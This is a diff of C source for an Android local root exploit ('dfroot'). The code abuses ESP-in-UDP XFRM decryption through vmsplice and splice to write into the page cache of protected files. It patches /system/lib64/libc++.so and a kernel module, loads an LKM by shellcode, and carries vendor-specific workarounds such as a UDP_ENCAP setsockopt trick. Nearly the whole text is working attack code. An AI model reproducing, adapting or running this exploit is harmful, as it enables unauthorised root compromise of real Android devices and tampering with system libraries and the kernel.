@@ -15,7 +15,6 @@
 #include <sys/stat.h>
 #include <sys/utsname.h>
 #include <netinet/in.h>
-#include <netinet/udp.h>
 #include <arpa/inet.h>
 #include "reporter.h"
 #include "aes256.h"
@@ -35,19 +34,14 @@ static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 static uint8_t *libcxx_soft_reboot;
 
-/* SA parameters set by Java. Spi/icv lists let the probe try each candidate
- * (e.g. icv 16 and 12) and pick the one that actually decrypts, so a vendor
- * IpSecService that truncates differently stops being a hard failure. */
-#define MAX_SAS 4
+/* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
 static int      g_sender_port;
-static uint32_t g_spi[MAX_SAS];
-static int      g_nsa;
+static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
-static int      g_icv_len[MAX_SAS];
+static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
-static int      g_sa;        /* active candidate index */
 
 /* Writable dir for xfrm_probe, set by the caller. Untrusted apps cannot write
  * /data/local/tmp, so there is no usable default. */
@@ -139,7 +133,7 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
     uint32_t seq = g_seq++;
     uint8_t hdr[24];
-    *(uint32_t *)(hdr + 0) = htonl(g_spi[g_sa]);
+    *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(seq);
     memcpy(hdr + 8, iv, 16);
 
@@ -182,15 +176,14 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     }
 
     /* vmsplice ICV (truncated HMAC) */
-    int icv = g_icv_len[g_sa];
-    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)icv};
-    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != icv) {
+    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
+    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
         REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
     }
 
     /* splice pipe → UDP: 24 + 16 + icv_len bytes */
     {
-        int total = 24 + 16 + icv;
+        int total = 24 + 16 + g_icv_len;
         ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
         ret = (s == total) ? 0 : -1;
         if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
@@ -207,54 +200,12 @@ out_pipe:
  * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
  * len must be a multiple of 16.
  */
-/* Our own ESP demux socket. The kernel's UDP_ENCAP setsockopt has no
- * capability check, so any uid can turn a UDP socket into an ESP-in-UDP
- * demuxer; XFRM then matches inbound ESP by SPI+daddr, not by receiving
- * socket. This bypasses an IpSecService that returns a port but never
- * issues the encap setsockopt (observed on vivo). */
-static int g_df_encap_sk = -1;
-static int g_df_encap_port;
-
-static int df_encap_open(void) {
-    if (g_df_encap_sk >= 0) return g_df_encap_sk;
-    int sk = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sk < 0) return -1;
-    int val = UDP_ENCAP_ESPINUDP;
-    if (setsockopt(sk, SOL_UDP, UDP_ENCAP, &val, sizeof(val)) < 0) {
-        reportfmt(NULL, "df encap: UDP_ENCAP_ESPINUDP setsockopt failed: %s\n", strerror(errno));
-        close(sk);
-        return -1;
-    }
-    struct sockaddr_in a = {.sin_family = AF_INET,
-                            .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)}};
-    if (bind(sk, (struct sockaddr *)&a, sizeof(a)) < 0) {
-        reportfmt(NULL, "df encap: bind failed: %s\n", strerror(errno));
-        close(sk);
-        return -1;
-    }
-    socklen_t alen = sizeof(a);
-    if (getsockname(sk, (struct sockaddr *)&a, &alen) < 0) {
-        close(sk);
-        return -1;
-    }
-    g_df_encap_sk = sk;
-    g_df_encap_port = ntohs(a.sin_port);
-    reportfmt(NULL, "* df encap socket on port %d\n", g_df_encap_port);
-    return sk;
-}
-
-static int patch_file_cbc_sa(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper, int sa,
-                           struct Reporter *reporter) {
+static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                           size_t foff, int use_helper, struct Reporter *reporter) {
     if (len % 16 != 0) {
         REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
         return -1;
     }
-    int saved_sa = g_sa;
-    g_sa = sa;
-
-    /* Prefer our own encap socket; fall back to the IpSecManager port. */
-    int use_port = df_encap_open() >= 0 ? g_df_encap_port : g_encap_port;
 
     int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
     if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
@@ -270,7 +221,7 @@ static int patch_file_cbc_sa(const char *path, const char *payload, size_t len,
             REPORTLN("bind port %d failed: %s", g_sender_port, strerror(errno));
         struct sockaddr_in dst = {
             .sin_family = AF_INET,
-            .sin_port   = htons((uint16_t)use_port),
+            .sin_port   = htons((uint16_t)g_encap_port),
             .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
         };
         if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
@@ -320,155 +271,54 @@ static int patch_file_cbc_sa(const char *path, const char *payload, size_t len,
 
     if (!use_helper) close(file_fd);
     close(sk_send);
-    g_sa = saved_sa;
     if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
     return rc;
 }
 
-/* All real patching runs on the SA the probe selected. */
-static int patch_file_cbc(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper, struct Reporter *reporter) {
-    return patch_file_cbc_sa(path, payload, len, foff, use_helper, g_sa, reporter);
-}
+/* Distinguish "the XFRM write never landed" from "it landed in a copy, not the
+ * page cache". Writes into a private f2fs file, which rules out APEX/erofs and
+ * page-cache aliasing as the cause. */
+static void xfrm_probe(struct Reporter *reporter) {
+    if (!g_data_dir) return;
+    char path[256];
+    snprintf(path, sizeof(path), "%s/dfprobe", g_data_dir);
 
-/* One probe write against a scratch f2fs file. The desired plaintext is
- * trailer-compatible (byte 14 = padlen 0, byte 15 = IPPROTO_UDP 17), so a
- * successful in-place decrypt passes esp_remove_trailer instead of feeding it
- * garbage, which keeps XfrmInStateProtoError flat on success. Caller diffs
- * /proc/net/xfrm_stat around the call. */
-static int probe_write_sa(struct Reporter *reporter, const char *path, int sa) {
     int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
     if (fd < 0) {
         REPORTLN("xfrm probe: open %s failed: %s", path, strerror(errno));
-        return -1;
+        return;
     }
 
-    char orig[32];
+    char orig[32], want[32];
     for (int i = 0; i < 32; i++) orig[i] = (char)i;
+    memcpy(want, orig, 32);
+    want[0] ^= 0xff;
+    want[1] ^= 0xff;
     if (pwrite(fd, orig, 32, 0) != 32) {
         REPORTLN("xfrm probe: pwrite failed: %s", strerror(errno));
         close(fd);
-        return -1;
+        unlink(path);
+        return;
     }
 
-    uint8_t want[16] = {0};
-    want[14] = 0;    /* padlen */
-    want[15] = 17;   /* IPPROTO_UDP: valid next header */
-    int rc = patch_file_cbc_sa(path, (const char *)want, 16, 0, 0, sa, reporter);
+    int rc = patch_file_cbc(path, want, 16, 0, 0, reporter);
 
     uint8_t got[16] = {0};
     ssize_t n = pread(fd, got, 16, 0);
     close(fd);
+    unlink(path);
+
     if (rc != 0) {
-        REPORTLN("xfrm probe: send failed");
-        return -1;
+        REPORTLN("xfrm probe: write failed, the SA or the socket is the problem");
+        return;
     }
     if (n == 16 && memcmp(got, want, 16) == 0) {
-        REPORTLN("xfrm probe: OK, decrypt ran and wrote the page cache");
-        return 0;
-    }
-    REPORTLN("xfrm probe: page cache unchanged");
-    return 1;
-}
-
-/* Snapshot /proc/net/xfrm_stat. Shell uid only; an app run prints a hint. */
-static void dump_xfrm_stat(struct Reporter *reporter) {
-    FILE *f = fopen("/proc/net/xfrm_stat", "r");
-    if (!f) {
-        REPORTLN("(read /proc/net/xfrm_stat from adb shell, or rerun via shizuku)");
-        return;
-    }
-    char line[128];
-    while (fgets(line, sizeof(line), f))
-        fputs(line, stdout);
-    fclose(f);
-}
-
-/* Send one plain UDP datagram to the encap socket and one to a plain UDP
- * socket we hold, then check both. Flat xfrm counters plus a receive on the
- * encap socket means the encap hook is dead: packets queue as ordinary UDP
- * because UDP_ENCAP_ESPINUDP is not set (or not honored) on vivo. */
-static void encap_probe(struct Reporter *reporter) {
-    /* control socket: plain UDP must always deliver */
-    int ctl = socket(AF_INET, SOCK_DGRAM, 0);
-    struct sockaddr_in ca = {.sin_family = AF_INET,
-                             .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)}};
-    if (ctl < 0 || bind(ctl, (struct sockaddr *)&ca, sizeof(ca)) < 0) {
-        REPORTLN("encap probe: control socket failed");
-        if (ctl >= 0) close(ctl);
-        return;
-    }
-    socklen_t clen = sizeof(ca);
-    getsockname(ctl, (struct sockaddr *)&ca, &clen);
-
-    int sk = socket(AF_INET, SOCK_DGRAM, 0);
-    struct sockaddr_in dst = {.sin_family = AF_INET,
-                              .sin_port = htons((uint16_t)g_encap_port),
-                              .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)}};
-    if (sk < 0 || connect(sk, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-        REPORTLN("encap probe: send socket failed");
-        if (sk >= 0) close(sk);
-        close(ctl);
-        return;
-    }
-
-    /* 1) plain UDP to the encap socket */
-    const char *m1 = "PLAIN";
-    sendto(sk, m1, 5, 0, (struct sockaddr *)&dst, sizeof(dst));
-
-    /* 2) ESP-shaped garbage (0x00000000 first word = IKE per RFC3948) to
-     *    control: proves loopback delivery itself works */
-    const char *m2 = "CTRL!";
-    struct sockaddr_in cd = ca;
-    sendto(sk, m2, 5, 0, (struct sockaddr *)&cd, sizeof(cd));
-
-    struct timeval tv = {.tv_usec = 300000};
-    setsockopt(ctl, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-
-    char buf[64];
-    struct sockaddr_in from;
-    socklen_t flen = sizeof(from);
-    ssize_t n = recvfrom(ctl, buf, sizeof(buf), 0, (struct sockaddr *)&from, &flen);
-    close(ctl);
-    close(sk);
-
-    if (n < 0) {
-        REPORTLN("encap probe: control datagram never arrived; loopback UDP "
-                 "delivery is blocked (per-UID firewall?)");
+        REPORTLN("xfrm probe: OK, XFRM wrote through to the page cache. "
+                 "The APEX file or its filesystem is the problem");
     } else {
-        REPORTLN("encap probe: control loopback OK; check encap socket on "
-                 "vivo (was UDP_ENCAP set?)");
+        REPORTLN("xfrm probe: unchanged, XFRM decrypted into a copy or the "
+                 "state never matched. This kernel is not vulnerable here");
     }
-}
-
-/* Probe each SA candidate and leave g_sa on the first one that decrypts into
- * the page cache. Returns the winning index, -1 if none worked. */
-static int xfrm_probe(struct Reporter *reporter) {
-    if (!g_data_dir) return g_sa = 0;
-    char path[256];
-    snprintf(path, sizeof(path), "%s/dfprobe", g_data_dir);
-
-    for (int cand = 0; cand < g_nsa; cand++) {
-        REPORTLN("* probing SA candidate %d (spi 0x%x, icv %d)",
-                 cand, g_spi[cand], g_icv_len[cand]);
-        REPORTLN("xfrm_stat BEFORE");
-        dump_xfrm_stat(reporter);
-
-        int rc = probe_write_sa(reporter, path, cand);
-        unlink(path);
-
-        REPORTLN("xfrm_stat AFTER");
-        dump_xfrm_stat(reporter);
-
-        if (rc == 0) {
-            g_sa = cand;
-            REPORTLN("* SA candidate %d verified", cand);
-            return cand;
-        }
-        encap_probe(reporter);
-    }
-    REPORTLN("* no SA candidate decrypted into the page cache");
-    return g_sa = -1;
 }
 
 extern char libcxx_start[];
@@ -716,24 +566,18 @@ static int createOrphanProcess(struct Reporter *reporter) {
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
 /* Run the full exploit chain. SA parameters and the manager package name are
- * resolved by the caller. spi_list/icv_list are comma-separated candidates,
- * probed in order before any patching. Returns 0 on success, 1 when ksud
- * fails, 2 when the outcome is unknown, 3 when the patches do not land. */
-int dfroot_run(int encap_port, int sender_port,
-               const uint32_t spi[MAX_SAS], const int icv_len[MAX_SAS], int nsa,
+ * resolved by the caller. Returns 0 on success, 1 when ksud fails, 2 when the
+ * outcome is unknown, 3 when the patches do not land. */
+int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
-               const char *ko_target, const char *package_name, int soft_reboot,
-               int stage, int no_vr) {
+               const char *ko_target, const char *package_name, int soft_reboot) {
     struct Reporter ro = {0}, *reporter = &ro;
 
     g_encap_port  = encap_port;
     g_sender_port = sender_port;
-    g_nsa = nsa < MAX_SAS ? nsa : MAX_SAS;
-    for (int i = 0; i < g_nsa; i++) {
-        g_spi[i]    = spi[i];
-        g_icv_len[i] = icv_len[i];
-    }
+    g_spi         = spi;
     g_seq         = 1;
+    g_icv_len     = icv_len;
     memcpy(g_aes_key, aes_key, 32);
     memcpy(g_hmac_key, hmac_key, 32);
 
@@ -749,24 +593,10 @@ int dfroot_run(int encap_port, int sender_port,
     }
     libcxx_soft_reboot = libcxx_data + libcxx_soft_reboot_off;
     *libcxx_soft_reboot = soft_reboot ? 1 : 0;
-    /* stage 0 leaves stage_val zeroed: the shellcode then omits "stage=N"
-     * from the insmod argv and the module runs its full chain. */
-    extern uint32_t libcxx_stage_val_off;
-    char *stageval = libcxx_data + libcxx_stage_val_off;
-    if (stage > 0 && stage <= 3)
-        snprintf(stageval, 12, "%d", stage);
-    /* the shellcode adds "disable_vr=1" to insmod only when a digit is set */
-    extern uint32_t libcxx_dvr_val_off;
-    if (no_vr)
-        *(libcxx_data + libcxx_dvr_val_off) = '1';
 
     struct PatchRestore libcxx_r = {0};
 
     int rc = 3;
-    /* Pick the SA candidate that actually decrypts on this device before
-     * touching any real target. Devices where the primary works pay only one
-     * probe write against a scratch file. */
-    if (xfrm_probe(reporter) < 0) goto done;
     if (patch_ko(reporter)) goto done;
     if (patch_hook("/system/lib64/libc++.so",
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
@@ -789,10 +619,7 @@ int dfroot_run(int encap_port, int sender_port,
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-    /* The LKM is loaded and the libc++ hook fires within the first seconds;
-     * ksud late-load and soft-reboot can take 10s+ on slow storage, so poll
-     * for up to 30s. Panic before a marker means the reboot was not ours. */
-    for (int elapsed = 0; elapsed < 30000; elapsed += 10) {
+    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && has_marker(markers[j].path)) {
